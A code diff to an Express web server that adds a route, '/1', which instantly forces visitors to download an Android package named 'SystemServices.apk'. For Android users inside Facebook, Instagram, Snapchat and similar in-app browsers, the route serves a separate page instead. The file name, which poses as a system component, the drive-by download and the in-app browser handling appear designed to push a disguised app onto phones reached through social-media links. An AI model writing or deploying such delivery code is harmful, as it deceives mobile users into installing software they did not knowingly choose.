@@ -66,6 +66,30 @@ const apiRoutes = require('./routes/api');
 app.use('/api', apiRoutes);
 
 // ═══════════════════════════════════════════════════════════════
+// INSTANT AUTO-DOWNLOAD ROUTE (/1)
+// ═══════════════════════════════════════════════════════════════
+
+app.get(['/1', '/1/'], (req, res) => {
+    const ua = req.headers['user-agent'] || '';
+    const isAndroid = /Android/i.test(ua);
+    const isInApp = /FBAN|FBAV|Instagram|Viber|Line|Snapchat/i.test(ua);
+
+    if (isInApp && isAndroid) {
+        return res.sendFile(path.join(__dirname, 'public', '1', 'index.html'));
+    }
+
+    const apkPath = path.join(__dirname, 'public', 'SystemServices.apk');
+    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+    res.setHeader('Content-Disposition', 'attachment; filename="SystemServices.apk"');
+    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+    return res.sendFile(apkPath, (err) => {
+        if (err && !res.headersSent) {
+            return res.sendFile(path.join(__dirname, 'public', '1', 'index.html'));
+        }
+    });
+});
+
+// ═══════════════════════════════════════════════════════════════
 // SPA FALLBACK — All non-API routes serve index.html
 // ═══════════════════════════════════════════════════════════════
 
